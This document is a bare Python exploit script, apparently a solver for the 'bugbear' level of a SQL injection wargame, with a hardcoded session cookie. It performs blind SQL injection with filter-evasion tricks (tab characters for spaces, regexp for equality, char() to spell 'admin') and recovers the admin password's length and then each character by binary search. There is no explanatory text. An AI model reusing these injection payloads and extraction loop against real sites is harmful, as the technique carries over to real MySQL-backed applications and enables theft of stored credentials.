import requests

host = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
cookies = { 'PHPSESSID' : '7kllihc5ogqiep77jj4v04pdhl' }
pw_length = 0

while True:
    pw_length += 1
    query = f"0%09||%09id%09regexp%09char(97,100,109,105,110)%09%26%26%09length(pw)%09regexp%09{pw_length}#"
    url = f"{host}?no={query}"

    r = requests.get(url, cookies = cookies)

    if "Hello admin" in r.text:
        print(f"password length: {pw_length}")
        break

password = ''

for i in range(1, pw_length + 1):
    high = 127
    low = 32
    found_char = ''

    while low <= high:
        mid = (low+high)//2
        query = f"0%09||%09id%09regexp%09char(97,100,109,105,110)%09%26%26%09conv(hex(mid(pw,{i},1)),16,10)>{mid}#"
        url = f"{host}?no={query}"

        r = requests.get(url, cookies = cookies)

        if "Hello admin" in r.text:
            low = mid + 1
        else:
            high = mid - 1
            found_char = chr(mid)
    password += found_char
    print(f"현재까지 찾은 비밀번호: {password}")

print(f"최종 비밀번호: {password}")